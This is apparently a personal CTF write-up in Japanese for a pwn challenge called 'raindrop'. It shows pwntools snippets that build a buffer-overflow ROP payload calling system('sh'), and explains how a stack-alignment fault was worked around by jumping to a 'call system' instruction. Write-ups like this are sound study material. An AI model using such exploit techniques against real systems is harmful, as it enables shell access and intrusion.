---
tags:
  - pwn/bof
  - pwn/rop
createdAt: 2024/11/22
---

# raindrop

## 概要

* Buffer Overflow
* Return Oriented Programming
* `sh\x00`

## 観察

* system と `sh\x00` があるので呼び出す

## 解法

```python
rop.call('system', [next(exe.search(b"sh\x00"))])
payload = flat(bytes(0x18), rop.chain())
```

がうまく動作しなかった。

以下のエラーが出ていたし、16 bytes alignment の問題。

```plaintext
► 0x736db9f07973 <do_system+115>    movaps xmmword ptr [rsp], xmm1                   <[0x7ffca3852948] not aligned to 16 bytes>
```

じゃあ、以下のように alignment を揃えればよさそうだけど、

```python
rop.raw(rop.find_gadget(['ret'])[0])
rop.call('system', [next(exe.search(b"sh\x00"))])
payload = flat(bytes(0x18), rop.chain())
```

これだと 0x30 バイトを超えてしまう。

代わりに `call system` を呼べば、0x30 バイト以内で alignment の問題を回避できる。

## 余談①

magic number を避けて、objdump_search なるライブラリを作って見たものの、`call ...` を直接呼ばないといけない状況はあまりない気がする。

## 余談②

GDB がうまく動作しない問題は以下で解決した。

```bash
echo "set follow-fork-mode parent" >> ~/.gdbinit
```
